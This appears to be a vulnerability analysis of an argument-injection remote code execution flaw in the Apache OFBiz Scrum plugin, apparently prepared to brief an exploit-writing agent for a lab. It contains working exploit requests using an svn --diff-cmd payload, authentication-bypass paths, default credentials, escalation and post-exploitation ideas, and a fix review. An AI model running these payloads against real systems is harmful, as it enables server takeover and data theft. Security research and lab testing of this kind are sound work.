# Vulnerability Analysis: CVE-2025-54466

## Executive Summary

CVE-2025-54466 is a **Remote Code Execution (RCE)** vulnerability in the Apache OFBiz Scrum plugin. The `viewScrumRevision()` and `retrieveMissingScrumRevision()` methods in `ScrumServices.java` construct `svn` shell commands by concatenating user-controlled parameters directly into command strings passed to `Runtime.getRuntime().exec(String)`. Although `exec(String)` does not invoke a shell (preventing shell metacharacter injection), it tokenizes by whitespace using `StringTokenizer`, enabling **SVN argument injection**. An attacker can inject SVN flags such as `--diff-cmd=<binary>` to execute arbitrary commands on the server.

---

## Root Cause

**Type:** CWE-94 — Improper Control of Generation of Code (Command/Argument Injection)

The root cause is the **direct concatenation of unsanitized user input** (`repository` and `repositoryRoot` parameters) into command strings passed to `Runtime.getRuntime().exec(String)`.

Java's `Runtime.exec(String)` tokenizes the command string by whitespace (using `StringTokenizer`) and passes the resulting tokens as the command and arguments to the operating system. While this is NOT shell execution (so metacharacters like `;`, `|`, `&&`, `$()` do not work), it means **any whitespace-separated tokens injected via user input become additional command-line arguments** to the `svn` binary.

The SVN command-line client supports flags that execute external programs:
- `--diff-cmd=<program>` — specifies an external program to use for diffing
- `--config-dir=<path>` — specifies a configuration directory (can contain hooks)

By injecting `--diff-cmd=/path/to/binary` into the `repository` parameter, an attacker causes SVN to execute an arbitrary binary when it encounters file differences to display.

---

## Vulnerable File(s) and Function(s)

### Primary: `viewScrumRevision()` — Lines 132-166

**File:** `scrum/src/main/java/org/apache/ofbiz/scrum/ScrumServices.java`

```java
// Line 135-136: User input retrieved with NO validation
String revision = (String) context.get("revision");
String repository = (String) context.get("repository");

// Line 141: Only isEmpty check — no format/content validation
if (UtilValidate.isNotEmpty(repository) && UtilValidate.isNotEmpty(revision)) {

    // Line 143-144: VULNERABLE — String concatenation + exec(String)
    String logCommand = "svn log -r" + revision + " " + repository;
    Process logProcess = Runtime.getRuntime().exec(logCommand);

    // Line 150-151: VULNERABLE — Same pattern for diff command
    String diffCommand = "svn diff -r" + Integer.toString((Integer.parseInt(revision.trim()) - 1))
        + ":" + revision + " " + repository;
    Process diffProcess = Runtime.getRuntime().exec(diffCommand);
}
```

**Two injection points in this method:**
1. `svn log` command (line 143-144) — `repository` appended to log command
2. `svn diff` command (line 150-151) — `repository` appended to diff command

**Note:** The `revision` parameter is constrained by `Integer.parseInt()` on line 150, which throws `NumberFormatException` if it's not a valid integer. This makes `revision` NOT exploitable for injection. The **`repository` parameter is the sole injection vector**.

### Secondary: `retrieveMissingScrumRevision()` — Lines 176-257

**File:** `scrum/src/main/java/org/apache/ofbiz/scrum/ScrumServices.java`

```java
// Line 180-181: User input retrieved with NO validation
String latestRevision = (String) context.get("latestRevision");
String repositoryRoot = (String) context.get("repositoryRoot");

// Line 184: Only isEmpty check
if (UtilValidate.isNotEmpty(repositoryRoot) && UtilValidate.isNotEmpty(latestRevision)) {
    Integer revision = Integer.parseInt(latestRevision.trim());
    for (int i = 1; i <= revision; i++) {
        // Line 189-190: VULNERABLE — same pattern
        String logCommand = "svn log -r" + i + " " + repositoryRoot;
        Process logProcess = Runtime.getRuntime().exec(logCommand);
    }
}
```

**One injection point:** `repositoryRoot` parameter concatenated into `svn log` command.

**Note:** `latestRevision` is constrained by `Integer.parseInt()` (line 185), so it's not exploitable. The `repositoryRoot` parameter is the injection vector. Additionally, this method iterates from 1 to `latestRevision`, spawning a new `svn log` process for each iteration — setting `latestRevision` to a large value creates a denial-of-service amplification.

### Not Vulnerable: `removeDuplicateScrumRevision()` — Lines 267-314

This method takes `repositoryRoot` from context but uses it only for entity queries (string manipulation + EntityCondition LIKE clause), NOT for `Runtime.exec()`. The OFBiz entity engine parameterizes queries, so this is not vulnerable to injection.

---

## Triggering Input

### Primary Attack Vector (`viewScrumRevision` via `svn diff --diff-cmd`)

**Parameters:**
- `revision` = `2` (must be a valid integer ≥ 2, matching an existing SVN revision)
- `repository` = `--diff-cmd=/usr/bin/id file:///tmp/svnrepo`

**Resulting command after concatenation:**
```
svn diff -r1:2 --diff-cmd=/usr/bin/id file:///tmp/svnrepo
```

**After `StringTokenizer` tokenization by whitespace:**
```
["svn", "diff", "-r1:2", "--diff-cmd=/usr/bin/id", "file:///tmp/svnrepo"]
```

**What happens:**
1. SVN connects to `file:///tmp/svnrepo` (must be a valid SVN repository with ≥2 revisions)
2. SVN retrieves the differences between revision 1 and revision 2
3. SVN invokes `/usr/bin/id` as the external diff program, passing it temp file paths as arguments
4. The output of `/usr/bin/id` (e.g., `uid=0(root) gid=0(root) ...`) is captured as "diff output"
5. The service returns this output in the `diffMessage` field
6. The FreeMarker template `Revision.ftl` renders `${result.diffMessage}` directly in the HTTP response

**This is an in-band RCE — command output is visible in the HTTP response body.**

### Alternative Attack Vector (`viewScrumRevision` via `svn log --diff --diff-cmd`)

**Parameters:**
- `revision` = `2`
- `repository` = `--diff --diff-cmd=/usr/bin/id file:///tmp/svnrepo`

**Resulting tokenized command:**
```
["svn", "log", "-r2", "--diff", "--diff-cmd=/usr/bin/id", "file:///tmp/svnrepo"]
```

`svn log --diff` shows inline diffs, and `--diff-cmd` specifies the program. Output appears in `logMessage`.

### Simplified Proof (no real SVN repo needed)

Even without a valid SVN repository, the process spawning can be demonstrated:
- `repository` = `--version` → causes `svn log -r2 --version` → svn prints version info and exits
- Confirms argument injection without needing a full SVN setup

For full RCE (executing `--diff-cmd`), a valid SVN repository with actual file changes between revisions is required.

---

## Attack Scenario

### Step-by-Step Exploitation

1. **Reconnaissance:** Attacker identifies an Apache OFBiz instance with the scrum plugin enabled (e.g., via `/scrum/control/main` returning a valid page)

2. **Set up SVN Repository (for full RCE):** 
   - If targeting `--diff-cmd`, the attacker needs a reachable SVN repository. Options:
     - Host an SVN server accessible from the target (e.g., `svn://attacker.com/repo`)
     - Use a `file://` path if the attacker has filesystem access (e.g., via file upload)
   - The repository needs at least 2 revisions with file changes
   - Alternatively, for proof-of-concept, use `--version` injection which needs no repo

3. **Authentication (if needed):**
   - **For OFBiz < 18.12.16:** Use the view override bypass (Path 1 below)
   - **For any version with demo data:** Use `admin`/`ofbiz` or `scrumadmin`/`ofbiz` credentials
   - **For OFBiz < 18.12.11:** Use CVE-2023-51467 auth bypass (`requirePasswordChange=Y`)

4. **Send Exploit Request:**
   ```
   GET /scrum/control/RevisionInfo?revision=2&repository=--diff-cmd%3D/usr/bin/id+file:///tmp/svnrepo HTTP/1.1
   Host: target:8443
   Cookie: <session_cookie>
   ```
   Note: `+` is URL-encoded space, `%3D` is `=`

5. **Receive Command Output:** The HTTP response body contains the output of `/usr/bin/id` rendered in the `<pre>` tag within the diff section.

### Unauthenticated Access Paths

#### Path 1: View Override Bypass (OFBiz < 18.12.16, before CVE-2024-45195 fix)

OFBiz's `overrideViewUri` mechanism allows bypassing controller-level auth by chaining a no-auth request-map with an arbitrary view:

```
GET /scrum/control/ListLocales/RevisionInfo?revision=2&repository=PAYLOAD HTTP/1.1
```

Here `ListLocales` is inherited from `common-controller.xml` with `auth="false"` and no event. When the event returns null, the `overrideViewUri` (`RevisionInfo`) replaces the view, rendering the screen that invokes `viewScrumRevision`.

Other viable no-auth request-maps: `viewBlocked`, `showHelpPublic`, `LookupTimeDuration`

#### Path 2: Default Credentials (demo deployments)

The scrum plugin ships demo data (`scrumDemoData.xml`) with well-known credentials:
| Username | Password | Role |
|---|---|---|
| `admin` | `ofbiz` | FULLADMIN |
| `scrumadmin` | `ofbiz` | SCRUM_ADMIN |
| `scrummaster` | `ofbiz` | SCRUM_MASTER |
| `productowner` | `ofbiz` | SCRUM_PRODUCT_OWNER |
| `scrumteam1`-`scrumteam4` | `ofbiz` | SCRUM_TEAM |

#### Path 3: Chain with Prior Auth Bypass CVEs

CVE-2025-54466 affects **all versions before 24.09.02**. Many of those versions are also vulnerable to:
- **CVE-2023-49070** (XML-RPC pre-auth, < 18.12.10)
- **CVE-2023-51467** (`requirePasswordChange` bypass, < 18.12.11)
- **CVE-2024-38856** (ProgramExport view override, < 18.12.15)
- **CVE-2024-45195** (general forced browsing, < 18.12.16)

---

## Impact

- **Confidentiality:** HIGH — Attacker can read arbitrary files via command execution (e.g., `cat /etc/passwd`)
- **Integrity:** HIGH — Attacker can write files, modify system state, install backdoors
- **Availability:** HIGH — Attacker can crash the server, delete data, or create resource exhaustion
- **Attack Complexity:** LOW — Straightforward HTTP request with crafted parameters
- **Privileges Required:** NONE (with view override bypass or default creds) or LOW (any authenticated user)
- **CVSS 3.1:** 9.8 (CRITICAL) per NVD scoring

### In-Band Command Output

The FreeMarker template `Revision.ftl` renders command output directly in the response:
```html
<pre>${result.logMessage}</pre>    <!-- output from svn log (+ injected commands) -->
<pre>${result.diffMessage}</pre>   <!-- output from svn diff (+ injected commands) -->
```

This makes the vulnerability an **in-band RCE** where the attacker sees command output directly in the HTTP response, not blind.

---

## Authentication Requirements

### For Authenticated Exploitation

1. **Login endpoint:** `POST /scrum/control/login` with form parameters `USERNAME=admin&PASSWORD=ofbiz`
2. **Session handling:** OFBiz sets a `JSESSIONID` cookie and `OFBiz.Visitor` cookie
3. **Token format:** Standard Java servlet session ID (e.g., `JSESSIONID=abc123.jvmRoute`)
4. **CSRF:** OFBiz does not enforce CSRF tokens for GET requests; the `RevisionInfo` endpoint accepts GET
5. **Default credentials:** `admin`/`ofbiz` (loaded via demo data)

### For Unauthenticated Exploitation

Use the view override bypass pattern (see Attack Scenario, Path 1). No authentication needed on OFBiz versions prior to the CVE-2024-45195 fix (18.12.16).

---

## Fix Assessment

### What the Fix Does

The fix (commit `ae0c279b`) applies three changes:

1. **Input Validation (EFFECTIVE):** Added `UtilValidate.isValidUrl(repository)` and `UtilValidate.isInteger(revision)` checks before command construction. `isValidUrl` delegates to Apache Commons `UrlValidator` which enforces `scheme://host/path` format, rejecting payloads like `--diff-cmd=/usr/bin/id file:///tmp/svnrepo`. `isInteger` ensures only digit characters.

2. **Array-based exec (INCORRECTLY IMPLEMENTED):** Changed from `Runtime.exec(String)` to `Runtime.exec("svn", new String[]{...})`. However, this actually calls `exec(String command, String[] envp)` where the array is treated as **environment variables**, not command arguments. The developer intended `exec(String[])` but passed a `String` as the first arg. This accidentally breaks the feature (svn runs with no arguments) but prevents injection.

3. **Test case:** Added `testViewScrumRevisionBadCall` that verifies injection payloads produce empty results. The original positive test (`testViewScrumRevision`) was commented out (likely because the broken exec call makes the feature non-functional).

### Fix Scope

- ✅ `viewScrumRevision()` — Both `svn log` and `svn diff` calls patched
- ✅ `retrieveMissingScrumRevision()` — `svn log` call patched
- ✅ `removeDuplicateScrumRevision()` — Not vulnerable (no exec calls)

### Fix Quality Assessment

The fix is **effective at preventing the vulnerability** despite the exec() implementation bug. The primary defense is the `isValidUrl()` + `isInteger()` input validation, which correctly rejects injection payloads. A URL that passes `UrlValidator` cannot contain unescaped spaces or argument-like prefixes (`--`), so SVN argument injection is blocked.

**Edge cases considered:**
- URL-encoded spaces (`%20`) — `Runtime.exec()` does not URL-decode; `%20` remains literal → no bypass
- Tab/newline injection — `UrlValidator` rejects these characters → no bypass
- Null bytes — `UrlValidator` rejects these → no bypass
- Unicode normalization — Java String comparison is byte-level; no normalization occurs → no bypass
- Empty string — `isValidUrl("")` returns `true` (DEFAULT_EMPTY_OK), BUT `isNotEmpty()` check precedes it → correctly handled
- `isInteger` for negative numbers — rejects `-` character → safe

**The fix is complete for CVE-2025-54466.** There are no concrete bypass vectors through the validated code paths.

---

## Escalation Path

The vulnerability provides a **direct in-band RCE primitive**. The command output is rendered in the HTTP response body via the FreeMarker template. This is already the highest-impact primitive — no further escalation is needed.

Escalation chains that enhance the attack:
1. **From argument injection to full RCE:** Via `--diff-cmd=<binary>`, the attacker executes any binary. For arbitrary shell commands, the attacker can write a script via another mechanism (e.g., the OFBiz filesystem or another vuln) and point `--diff-cmd` at it.
2. **From limited command to arbitrary command:** Use `--diff-cmd=/bin/sh` with `--extensions` to pass `-c <command>` — but this is limited by `StringTokenizer` splitting on spaces. Instead, use `--diff-cmd` pointing to a base64-decode pipeline or a pre-existing script.
3. **Post-exploitation:** Read OFBiz configuration (database credentials, entity engine config), access the Derby/PostgreSQL database, pivot to internal network.

---

## Related Attack Surface

### All `Runtime.exec()` calls in the codebase (plugins repo)

All three `Runtime.exec()` calls in the entire plugins codebase are in `ScrumServices.java`:

| Line | Method | Command | Injection Vector |
|---|---|---|---|
| 144 | `viewScrumRevision()` | `svn log -r<revision> <repository>` | `repository` param |
| 151 | `viewScrumRevision()` | `svn diff -r<N-1>:<N> <repository>` | `repository` param |
| 190 | `retrieveMissingScrumRevision()` | `svn log -r<i> <repositoryRoot>` | `repositoryRoot` param |

No other files in the plugins repository use `Runtime.exec()` or `ProcessBuilder`.

### Service-level access to vulnerable methods

| Service | HTTP Endpoint | Auth | Injection Param |
|---|---|---|---|
| `viewScrumRevision` | `/scrum/control/RevisionInfo` (GET) | `auth="true"` | `repository` |
| `retrieveMissingScrumRevision` | No direct HTTP endpoint | `auth="true"` | `repositoryRoot` |
| `removeDuplicateScrumRevision` | No direct HTTP endpoint | `auth="true"` | N/A (not vulnerable) |

`retrieveMissingScrumRevision` has no HTTP controller mapping but could be invoked via:
- OFBiz XML-RPC endpoint (`/webtools/control/xmlrpc`)
- OFBiz SOAP endpoint (`/webtools/control/SOAPService`)
- Internal service chaining

---

## Build System

### Build Tool
- **Gradle** (wrapper included in the framework repository, not the plugins repo)
- **Java 17** (Eclipse Temurin JDK for compilation)

### Build Process

```bash
# 1. Clone framework at vulnerable version
git clone --branch release24.09.01 --depth 1 https://github.com/apache/ofbiz-framework.git /opt/ofbiz

# 2. Clone plugins into framework's plugins/ directory
cd /opt/ofbiz
git clone --branch release24.09.01 --depth 1 https://github.com/apache/ofbiz-plugins.git plugins

# 3. Build everything (compiles framework + all plugins including scrum)
./gradlew cleanAll loadAll
# This also loads demo data (admin/ofbiz credentials, scrum demo data)

# 4. Start OFBiz
./gradlew ofbiz
# Alternatively for production-like:
# ./gradlew "ofbiz --start"
```

### Build Commands (Docker context)

```bash
# Inside Dockerfile, with JDK 17 base:
WORKDIR /ofbiz
COPY . .
RUN ./gradlew cleanAll loadAll --no-daemon

# Runtime start:
CMD ["./gradlew", "ofbiz", "--no-daemon"]
# OR: bin/ofbiz (after gradle init)
```

### Dependencies

**Build-time:**
- Java 17 JDK (Eclipse Temurin recommended: `eclipse-temurin:17-jdk`)
- Gradle wrapper (included in framework repo)
- Internet access for Gradle dependency downloads

**Runtime:**
- Java 17 JRE
- `svn` client (Subversion) — **CRITICAL:** The vulnerable code calls `svn` commands. Without the `svn` binary in the container, the exec() calls fail with "No such file or directory" and the vulnerability cannot be triggered.
- `xsltproc` — Used by the Docker entrypoint script for configuration transformation

**System packages (for lab container):**
```bash
# On Debian/Ubuntu base:
apt-get install -y subversion xsltproc

# On Alpine:
apk add --no-cache subversion libxslt
```

### Runtime Requirements

- **Ports:** 8443 (HTTPS, default), 8080 (HTTP, if configured), 5005 (debug)
- **Database:** Embedded Apache Derby (default, no external DB needed)
- **Demo data:** Load with `OFBIZ_DATA_LOAD=demo` or `./gradlew loadAll` (creates admin/ofbiz user and scrum demo data)
- **SVN repository for RCE:** A local SVN repo is needed for `--diff-cmd` execution. Lab setup should create one:
  ```bash
  svnadmin create /tmp/svnrepo
  svn checkout file:///tmp/svnrepo /tmp/svnwc
  echo "initial" > /tmp/svnwc/test.txt
  svn add /tmp/svnwc/test.txt
  svn commit /tmp/svnwc -m "Initial commit"
  echo "modified" > /tmp/svnwc/test.txt
  svn commit /tmp/svnwc -m "Second commit"
  ```
- **Network:** Only needs localhost access for the lab. No external services required.

### Base Image Recommendation

```dockerfile
FROM eclipse-temurin:17-jdk AS builder
# ... build steps ...

FROM eclipse-temurin:17-jre AS runtime
RUN apt-get update && apt-get install -y --no-install-recommends subversion xsltproc && rm -rf /var/lib/apt/lists/*
# ... copy built artifacts ...
```

### Docker Compose Structure

```yaml
services:
  ofbiz:
    build: .
    ports:
      - "8443:8443"
      - "8080:8080"
    environment:
      - OFBIZ_DATA_LOAD=demo
    healthcheck:
      test: ["CMD", "curl", "-fk", "https://localhost:8443/accounting/control/main"]
      interval: 30s
      timeout: 10s
      retries: 10
      start_period: 120s  # OFBiz takes a while to start
```

---

## Key Facts for PoC Agent

1. **Target endpoint:** `GET /scrum/control/RevisionInfo?repository=PAYLOAD&revision=N`
2. **Injection parameter:** `repository` (URL parameter, passed directly to `svn` command line)
3. **Constraint on `revision`:** Must be a valid integer that parses with `Integer.parseInt()` and exists in the target SVN repo
4. **RCE mechanism:** SVN `--diff-cmd=<binary>` flag, which executes the specified binary when processing diffs
5. **Output visibility:** Command output is returned in the HTTP response body (in `diffMessage` or `logMessage` fields), rendered by `Revision.ftl`
6. **SVN repo requirement:** A valid SVN repository with ≥2 revisions and file changes is needed for `--diff-cmd` to fire. Lab must create one.
7. **Auth bypass for testing:** Use `admin`/`ofbiz` credentials (demo data) or the view override pattern (`/scrum/control/ListLocales/RevisionInfo?...`)
8. **Proof-of-concept (simple):** Use `repository=--version` to inject `--version` flag → SVN prints version info instead of querying a repo. This proves argument injection without needing an SVN repo, but doesn't demonstrate RCE.
9. **Proof-of-concept (full RCE):** Use `repository=--diff-cmd=/usr/bin/id+file:///tmp/svnrepo` with a local SVN repo → `id` output appears in response body.
